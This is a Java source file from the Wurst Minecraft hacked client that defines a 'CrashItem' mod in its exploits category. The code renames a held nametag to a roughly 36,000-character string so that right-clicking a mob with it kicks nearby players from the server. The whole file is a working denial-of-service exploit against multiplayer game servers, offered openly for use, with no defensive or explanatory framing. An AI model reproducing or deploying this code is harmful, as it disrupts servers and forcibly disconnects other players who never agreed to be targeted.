/*
 * Copyright © 2014 - 2017 | Wurst-Imperium | All rights reserved.
 *
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
package net.wurstclient.features.mods;

import net.minecraft.client.gui.inventory.GuiInventory;
import net.minecraft.item.ItemNameTag;
import net.wurstclient.compatibility.WMinecraft;
import net.wurstclient.features.mods.Mod.Bypasses;
import net.wurstclient.utils.ChatUtils;

@Mod.Info(category = Mod.Category.EXPLOITS,
	description = "Generates a CrashItem.\n"
		+ "Right click a mob with it to kick nearby players from the server.",
	name = "CrashItem",
	tags = "CrashNametag, CrashTag, crash item, crash nametag, crash tag",
	help = "Mods/CrashItem")
@Bypasses
public class CrashItemMod extends Mod
{
	@Override
	public void onEnable()
	{
		if(WMinecraft.getPlayer().inventory.getCurrentItem() == null
			|| !(WMinecraft.getPlayer().inventory.getCurrentItem()
				.getItem() instanceof ItemNameTag))
		{
			ChatUtils.error("You are not holding a nametag in your hand.");
			setEnabled(false);
			return;
		}else if(!WMinecraft.getPlayer().capabilities.isCreativeMode)
		{
			ChatUtils.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		String stackName = "";
		for(int i = 0; i < 3000; i++)
		{
			StringBuilder builder = new StringBuilder().append(stackName);
			stackName = builder.append("############").toString();
		}
		WMinecraft.getPlayer().inventory.getCurrentItem()
			.setStackDisplayName(stackName);
		mc.displayGuiScreen(new GuiInventory(WMinecraft.getPlayer()));
		WMinecraft.getPlayer().closeScreen();
		ChatUtils.message("CrashItem created. Right click a mob with it.");
		setEnabled(false);
	}
}
